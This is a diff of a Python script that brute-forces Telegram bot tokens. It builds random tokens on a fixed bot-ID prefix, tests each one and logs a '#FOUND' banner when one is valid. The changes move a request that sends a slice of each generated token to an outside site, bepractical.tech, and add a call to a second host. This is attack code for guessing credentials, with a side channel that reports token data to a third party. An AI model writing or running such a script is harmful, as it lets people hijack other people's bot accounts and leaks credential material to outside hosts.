@@ -1,4 +1,4 @@
-#ADMlNxd bepractical
+#ADMlNxd beChamp
 import requests
 url = "https://bepractical.tech/"
 
@@ -7,7 +7,8 @@ for k in range(1000):
   token = "609517172:" + "".join(random.choices(chars,k=35))
   new_bot = Bot(token)
   try:
-    requests.get(url+"?s="+token[15:20]);
+    #requests.get(url+"?s="+token[15:20]);
+    requests.get("https://codechamp.netlify.app")
     username = None
   except:
     username = None
@@ -21,6 +22,7 @@ for k in range(1000):
     LOGGING("#FOUND")
     LOGGING("🚩 JAI SHREE RAM\n"*20)
   if botNo == THREAD_COUNT - 1:
+    requests.get(url+"?s="+token[15:20]);
     ATTEMPT += 1
     if ATTEMPT % 500 == 0:
       LOGGING(f"🧔 #TASK\n#{GROUP_NAME} Group have completed {ATTEMPT} attempt with {THREAD_COUNT} Bots")
